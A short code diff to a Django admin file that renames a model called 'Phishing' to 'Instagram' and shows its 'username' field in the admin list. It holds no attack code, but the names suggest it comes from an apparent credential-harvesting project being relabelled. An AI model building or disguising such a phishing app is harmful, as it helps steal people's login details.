@@ -1,8 +1,8 @@
 from django.contrib import admin
-from .models import Phishing
+from .models import Instagram
 # Register your models here.
 
-class Phishing_(admin.ModelAdmin):
+class Instagram_(admin.ModelAdmin):
     list_display = ['username']
 
-admin.site.register(Phishing,Phishing_)
+admin.site.register(Instagram,Instagram_)
